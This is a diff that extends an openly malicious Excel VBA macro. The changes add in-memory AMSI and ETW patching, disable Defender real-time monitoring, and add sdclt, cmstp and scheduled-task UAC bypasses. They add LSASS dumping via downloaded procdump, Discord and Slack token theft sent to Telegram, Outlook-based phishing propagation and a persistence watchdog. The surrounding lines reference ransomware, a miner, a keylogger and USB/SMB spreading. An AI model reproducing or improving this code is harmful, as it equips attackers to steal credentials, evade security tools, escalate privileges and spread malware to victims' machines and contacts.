@@ -68,6 +68,7 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As LongPtr, ByVal cbMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
     Private Declare PtrSafe Function lstrlenW Lib "kernel32" (ByVal lpString As LongPtr) As Long
     Private Declare PtrSafe Function lstrlenA Lib "kernel32" (ByVal lpString As LongPtr) As Long
+    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
     Private Const CP_ACP = 0
 #Else
     ' VBA6 not supported – this code requires VBA7 (Office 2010+ 64‑bit)
@@ -122,6 +123,34 @@ Private Type MEMORYSTATUSEX
     ullAvailExtendedVirtual As LongLong
 End Type
 
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As LongPtr
+    lpDesktop As LongPtr
+    lpTitle As LongPtr
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As LongPtr
+    hStdInput As LongPtr
+    hStdOutput As LongPtr
+    hStdError As LongPtr
+End Type
+
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr
+    hThread As LongPtr
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+
 ' ========================
 ' GLOBAL VARIABLES
 ' ========================
@@ -133,10 +162,9 @@ Private gRunFlag As String
 Private gMachineID As String
 Private gFirstRun As Boolean
 Private gSelfPath As String
-
-' Collections for stolen credentials and email targets
-Private g_stolenCredentials As Object   ' Collection of "email|password"
-Private g_emailTargets As Object       ' Collection of email addresses
+Private gWatchdogActive As Boolean
+Private g_stolenCredentials As Object
+Private g_emailTargets As Object
 
 ' ========================
 ' UTILITIES
@@ -336,7 +364,7 @@ Function GetKeyName(vKey As Integer) As String
 End Function
 
 ' ========================
-' EVASION
+' EVASION – WITH FALLBACKS
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
@@ -379,15 +407,49 @@ End Function
 
 Sub PatchAMSI()
     On Error Resume Next
+    ' Method 1: Registry (safe)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
+    
+    ' Method 2: In-memory patching (more aggressive, fallback)
+    On Error Resume Next
+    Dim hAmsi As LongPtr: hAmsi = LoadLibraryA("amsi.dll")
+    If hAmsi <> 0 Then
+        Dim pAmsiScanBuffer As LongPtr: pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
+        If pAmsiScanBuffer <> 0 Then
+            Dim oldProtect As Long
+            If VirtualProtect(pAmsiScanBuffer, 6, &H40, oldProtect) Then
+                Dim patch(5) As Byte
+                patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
+                CopyMemory ByVal pAmsiScanBuffer, patch(0), 6
+                VirtualProtect pAmsiScanBuffer, 6, oldProtect, oldProtect
+            End If
+        End If
+        FreeLibrary hAmsi
+    End If
 End Sub
 
 Sub KillETW()
     On Error Resume Next
+    ' Registry method
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security\ETWEnabled", 0, "REG_DWORD"
+    
+    ' In-memory patching for ntdll!EtwEventWrite
+    Dim hNtdll As LongPtr: hNtdll = GetModuleHandleA("ntdll.dll")
+    If hNtdll <> 0 Then
+        Dim pEtwEventWrite As LongPtr: pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
+        If pEtwEventWrite <> 0 Then
+            Dim oldProtect As Long
+            If VirtualProtect(pEtwEventWrite, 4, &H40, oldProtect) Then
+                Dim patch(3) As Byte
+                patch(0) = &H33: patch(1) = &HC0: patch(2) = &HC2: patch(3) = &H14
+                CopyMemory ByVal pEtwEventWrite, patch(0), 4
+                VirtualProtect(pEtwEventWrite, 4, oldProtect, oldProtect)
+            End If
+        End If
+    End If
 End Sub
 
 Sub DisableDefender()
@@ -398,10 +460,11 @@ Sub DisableDefender()
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD"
+    wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD"
 End Sub
 
 ' ========================
-' PRIVILEGE ESCALATION (legacy – may not work on patched systems)
+' PRIVILEGE ESCALATION – MULTIPLE FALLBACK METHODS
 ' ========================
 Sub UACBypass_Fodhelper()
     On Error Resume Next
@@ -423,8 +486,54 @@ Sub UACBypass_ComputerDefaults()
     wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
 End Sub
 
+Sub UACBypass_Sdclt()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\DelegateExecute", "", "REG_SZ"
+    wsh.Run "sdclt.exe", 0, True
+    StealthSleep 3000
+    wsh.RegDelete "HKCU\Software\Classes\exefile\"
+End Sub
+
+Sub UACBypass_Cmstp()
+    On Error Resume Next
+    Dim infPath As String: infPath = GetTempDir() & "lz.inf"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(infPath, True)
+    f.WriteLine "[Version]"
+    f.WriteLine "Signature=$chicago$"
+    f.WriteLine "[DefaultInstall]"
+    f.WriteLine "CustomDestination=CustomDestinationSection"
+    f.WriteLine "[CustomDestinationSection]"
+    f.WriteLine "DefaultUIFont=MyUIFont"
+    f.WriteLine "[MyUIFont]"
+    f.WriteLine "FontName="
+    f.Close
+    CreateObject("WScript.Shell").Run "cmstp.exe /ni /s """ & infPath & """", 0, True
+    StealthSleep 3000
+    fso.DeleteFile infPath
+End Sub
+
+Sub UACBypass_SilentCleanup()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "schtasks /create /tn ""LazarusElevate"" /tr ""cmd.exe /c net localgroup administrators %username% /add"" /sc once /st 00:00 /ru SYSTEM /f", 0, True
+    wsh.Run "schtasks /run /tn ""LazarusElevate""", 0, True
+    StealthSleep 3000
+    wsh.Run "schtasks /delete /tn ""LazarusElevate"" /f", 0, True
+End Sub
+
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
+    ' Try modern methods first (may work on some systems)
+    UACBypass_Sdclt
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_Cmstp
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_SilentCleanup
+    If IsUserAdmin() Then Exit Sub
+    ' Legacy methods (patched but still worth a try)
     UACBypass_Fodhelper
     If IsUserAdmin() Then Exit Sub
     UACBypass_ComputerDefaults
@@ -514,7 +623,7 @@ Sub ExtractHashesFromNTDS()
 End Sub
 
 ' ========================
-' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers)
+' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers) – WITH FALLBACKS
 ' ========================
 Sub DumpLSASS()
     On Error Resume Next
@@ -536,15 +645,22 @@ Sub DumpLSASS()
     If pid = 0 Then Exit Sub
     Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    ' Try comsvcs first
     wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
     StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(dumpPath) Then
+        ' Fallback to procdump
         Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
-        If DownloadFile("https://live.sysinternals.com/procdump.exe", procdumpPath) Then
+        Dim procdumpUrls As Variant: procdumpUrls = Array("https://live.sysinternals.com/procdump.exe", "https://download.sysinternals.com/files/Procdump.zip")
+        Dim url As Variant
+        For Each url In procdumpUrls
+            If DownloadFile(url, procdumpPath) Then Exit For
+        Next
+        If FileExists(procdumpPath) Then
             wsh.Run procdumpPath & " -accepteula -ma " & pid & " " & dumpPath, 0, True
             StealthSleep 5000
-            If fso.FileExists(procdumpPath) Then Kill procdumpPath
+            Kill procdumpPath
         End If
     End If
     If fso.FileExists(dumpPath) Then
@@ -717,7 +833,7 @@ Private Sub ExtractAllCredentials()
 End Sub
 
 ' ========================
-' HARVEST EMAIL TARGETS
+' HARVEST EMAIL TARGETS – WITH FALLBACKS
 ' ========================
 Private Sub HarvestFromOutlookContacts()
     On Error Resume Next
@@ -830,7 +946,7 @@ Private Sub HarvestAllEmailTargets()
 End Sub
 
 ' ========================
-' SEND EMAIL USING STOLEN CREDENTIALS (CDO)
+' SEND EMAIL USING STOLEN CREDENTIALS – MULTIPLE METHODS
 ' ========================
 Private Function SendEmailWithCredential(cred As String, toEmail As String, attachmentPath As String) As Boolean
     On Error GoTo Fail
@@ -854,6 +970,7 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     End Select
     If smtpServer = "" Then Exit Function
     
+    ' Method 1: CDO.Message
     Dim msg As Object: Set msg = CreateObject("CDO.Message")
     Dim config As Object: Set config = CreateObject("CDO.Configuration")
     Dim fields As Object: Set fields = config.Fields
@@ -877,7 +994,18 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     SendEmailWithCredential = True
     Exit Function
 Fail:
-    SendEmailWithCredential = False
+    ' Method 2: Try using Outlook COM (if available)
+    On Error Resume Next
+    Dim olApp As Object: Set olApp = CreateObject("Outlook.Application")
+    If Not olApp Is Nothing Then
+        Dim mail As Object: Set mail = olApp.CreateItem(0)
+        mail.To = toEmail
+        mail.Subject = "Salary Deduction Notice"
+        mail.Body = "Dear employee, please review the attached document."
+        mail.Attachments.Add attachmentPath
+        mail.Send
+        SendEmailWithCredential = True
+    End If
 End Function
 
 Private Sub WildfireEmailPropagation()
@@ -902,57 +1030,76 @@ Private Sub WildfireEmailPropagation()
 End Sub
 
 ' ========================
-' DISCORD TOKEN THEFT
+' DISCORD TOKEN THEFT – WITH FALLBACK PATHS
 ' ========================
 Private Sub DiscordPropagation()
     On Error Resume Next
     Dim appData As String: appData = Environ("APPDATA")
-    Dim ldbPath As String: ldbPath = appData & "\discord\Local Storage\leveldb"
+    Dim possiblePaths As Variant
+    possiblePaths = Array(appData & "\discord\Local Storage\leveldb", _
+                         appData & "\Discord\Local Storage\leveldb", _
+                         appData & "\discordcanary\Local Storage\leveldb", _
+                         appData & "\discordptb\Local Storage\leveldb")
+    Dim path As Variant
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    If Not fso.FolderExists(ldbPath) Then Exit Sub
-    Dim file As Object
-    For Each file In fso.GetFolder(ldbPath).Files
-        If LCase(fso.GetExtensionName(file.Name)) = "ldb" Then
-            Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
-            Dim content As String: content = ts.ReadAll
-            ts.Close
-            Dim tokenPos As Long: tokenPos = InStr(1, content, """token""", vbTextCompare)
-            If tokenPos > 0 Then
-                Dim startPos As Long: startPos = InStr(tokenPos + 8, content, """", vbTextCompare) + 1
-                Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
-                If startPos > 0 And endPos > startPos Then
-                    Dim token As String: token = Mid(content, startPos, endPos - startPos)
-                    If Len(token) > 20 Then SendToTelegram "DISCORD_TOKEN|" & token
+    For Each path In possiblePaths
+        If fso.FolderExists(path) Then
+            Dim file As Object
+            For Each file In fso.GetFolder(path).Files
+                If LCase(fso.GetExtensionName(file.Name)) = "ldb" Then
+                    Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+                    Dim content As String: content = ts.ReadAll
+                    ts.Close
+                    Dim tokenPos As Long: tokenPos = InStr(1, content, """token""", vbTextCompare)
+                    If tokenPos > 0 Then
+                        Dim startPos As Long: startPos = InStr(tokenPos + 8, content, """", vbTextCompare) + 1
+                        Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
+                        If startPos > 0 And endPos > startPos Then
+                            Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                            If Len(token) > 20 Then SendToTelegram "DISCORD_TOKEN|" & token
+                        End If
+                    End If
                 End If
-            End If
+            Next
+            Exit For
         End If
     Next
 End Sub
 
 ' ========================
-' SLACK TOKEN THEFT
+' SLACK TOKEN THEFT – WITH FALLBACK PATHS
 ' ========================
 Private Sub SlackPropagation()
     On Error Resume Next
     Dim appData As String: appData = Environ("APPDATA")
-    Dim slackPath As String: slackPath = appData & "\Slack\storage"
+    Dim possiblePaths As Variant
+    possiblePaths = Array(appData & "\Slack\storage", _
+                         appData & "\slack\storage", _
+                         appData & "\Slack\Local Storage\leveldb")
+    Dim path As Variant
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    If Not fso.FolderExists(slackPath) Then Exit Sub
-    Dim file As Object
-    For Each file In fso.GetFolder(slackPath).Files
-        If LCase(fso.GetExtensionName(file.Name)) = "json" Then
-            Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
-            Dim content As String: content = ts.ReadAll
-            ts.Close
-            Dim tokenPos As Long: tokenPos = InStr(1, content, """token"":""", vbTextCompare)
-            If tokenPos > 0 Then
-                Dim startPos As Long: startPos = tokenPos + 9
-                Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
-                If endPos > startPos Then
-                    Dim token As String: token = Mid(content, startPos, endPos - startPos)
-                    If Len(token) > 10 Then SendToTelegram "SLACK_TOKEN|" & token
+    For Each path In possiblePaths
+        If fso.FolderExists(path) Then
+            Dim file As Object
+            For Each file In fso.GetFolder(path).Files
+                If LCase(fso.GetExtensionName(file.Name)) = "json" Or LCase(file.Name) Like "*.ldb" Then
+                    Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+                    Dim content As String: content = ts.ReadAll
+                    ts.Close
+                    Dim tokenPos As Long: tokenPos = InStr(1, content, """token"":""", vbTextCompare)
+                    If tokenPos = 0 Then tokenPos = InStr(1, content, """token"": """, vbTextCompare)
+                    If tokenPos > 0 Then
+                        Dim startPos As Long: startPos = tokenPos + 9
+                        If Mid(content, startPos - 1, 1) = " " Then startPos = startPos + 1
+                        Dim endPos As Long: endPos = InStr(startPos, content, """", vbTextCompare)
+                        If endPos > startPos Then
+                            Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                            If Len(token) > 10 Then SendToTelegram "SLACK_TOKEN|" & token
+                        End If
+                    End If
                 End If
-            End If
+            Next
+            Exit For
         End If
     Next
 End Sub
@@ -1094,13 +1241,14 @@ Sub RunRansomware()
 End Sub
 
 ' ========================
-' CLIPBOARD HIJACK (PUBLIC)
+' CLIPBOARD HIJACK (PUBLIC) – WITH UNICODE/ANSI FALLBACK
 ' ========================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next
     Dim text As String
     Static lastText As String
     If OpenClipboard(0) Then
+        ' Try Unicode first
         Dim hData As LongPtr: hData = GetClipboardData(13)
         If hData Then
             Dim pData As LongPtr: pData = GlobalLock(hData)
@@ -1108,7 +1256,9 @@ Public Sub ClipboardMonitorLoop()
                 text = PointerToUnicodeString(pData)
                 GlobalUnlock hData
             End If
-        Else
+        End If
+        ' Fallback to ANSI
+        If text = "" Then
             hData = GetClipboardData(1)
             If hData Then
                 pData = GlobalLock(hData)
@@ -1191,7 +1341,7 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION
+' PROPAGATION – USB & SMB
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
@@ -1260,7 +1410,7 @@ Sub EnableChromeRemoteDesktop()
 End Sub
 
 ' ========================
-' MINER DEPLOYMENT
+' MINER DEPLOYMENT – MULTIPLE URLS
 ' ========================
 Sub DeployMiner()
     On Error Resume Next
@@ -1312,7 +1462,7 @@ Sub DeploySocialEngineeringUI()
 End Sub
 
 ' ========================
-' PERSISTENCE (ROBUST)
+' PERSISTENCE (ROBUST) – WITH WATCHDOG
 ' ========================
 Sub InstallPermanentCopy()
     On Error Resume Next
@@ -1384,6 +1534,21 @@ Sub PersistAll()
 End Sub
 
 ' ========================
+' WATCHDOG – KEEPS MALWARE ALIVE
+' ========================
+Public Sub Watchdog()
+    If gWatchdogActive Then Exit Sub
+    gWatchdogActive = True
+    On Error Resume Next
+    ' Check if the main Excel instance is still running with the hidden loop
+    ' If not, restart it via VBS launcher
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "wscript.exe """ & Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs""", 0, False
+    ' Schedule next check
+    Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
+End Sub
+
+' ========================
 ' MAIN ENTRY POINT (PUBLIC)
 ' ========================
 Public Sub AutoExec()
@@ -1414,6 +1579,7 @@ Public Sub AutoExec()
     
     PersistAll
     Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
+    Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
     
     If IsDomainController() Then
         ExtractNTDSAndSYSTEM
@@ -1425,11 +1591,9 @@ Public Sub AutoExec()
         USBPropagation
         SMBPropagation
         
-        ' Initialize collections
         Set g_stolenCredentials = New Collection
         Set g_emailTargets = New Collection
         
-        ' New advanced features
         ExtractAllCredentials
         HarvestAllEmailTargets
         DiscordPropagation
